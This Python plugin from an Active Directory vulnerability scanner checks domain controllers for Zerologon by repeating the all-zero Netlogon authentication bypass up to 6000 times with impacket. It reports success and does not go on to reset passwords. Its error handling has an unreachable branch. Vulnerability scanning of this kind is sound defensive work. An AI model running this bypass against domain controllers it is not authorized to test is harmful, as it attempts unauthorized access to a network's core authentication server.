from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.dtypes import NULL

from plugins.AD import PluginADScanBase
from utils.consts import AllPluginTypes


class PluginADZeroLogon(PluginADScanBase):
    """
    Zerologon漏洞扫描
    """

    display = "Zerologon漏洞扫描"
    alias = "zero_lgn"
    p_type = AllPluginTypes.Scan

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def run_script(self, args) -> dict:
        try:
            dce = transport.DCERPCTransportFactory(f'ncacn_np:{self.dc_ip}[\\pipe\\netlogon]').get_dce_rpc()
            dce.connect()
            dce.set_credentials('', '')
            dce.bind(nrpc.MSRPC_UUID_NRPC)
        except Exception as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                self.result['status'] = 0
                return self.result
        MAX_ATTEMPTS = 6000
        serverName = self.dc_hostname
        for attempt in range(0, MAX_ATTEMPTS):
            nrpc.hNetrServerReqChallenge(dce, NULL, serverName + '\x00', b'\x00' * 8)
            ppp = b'\x00' * 8
            try:
                nrpc.hNetrServerAuthenticate3(dce, NULL, serverName + '$\x00',
                                              nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                              serverName + '\x00',
                                              ppp, 0x212effef)
                self.result['status'] = 1
                self.result['data']['instance_list'] = [{"ip address": self.dc_ip}]
                self.result[
                    'desc'] = f'[{self.dc_ip}] Netlogon Auth OK, successfully bypassed autentication using Zerologon after {attempt} attempts!'
                break
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                if ex.get_error_code() == 0xc0000022:
                    continue
                else:
                    pass
            except BaseException as ex:
                self.result['status'] = -1
                self.result['error'] = str(ex)
                break
            except Exception as ex:
                self.result['status'] = -1
                if 'STATUS_ACCESS_DENIED' in str(ex):
                    self.result['status'] = 0
                    continue
                self.result['error'] = str(ex)
                break

        return self.result
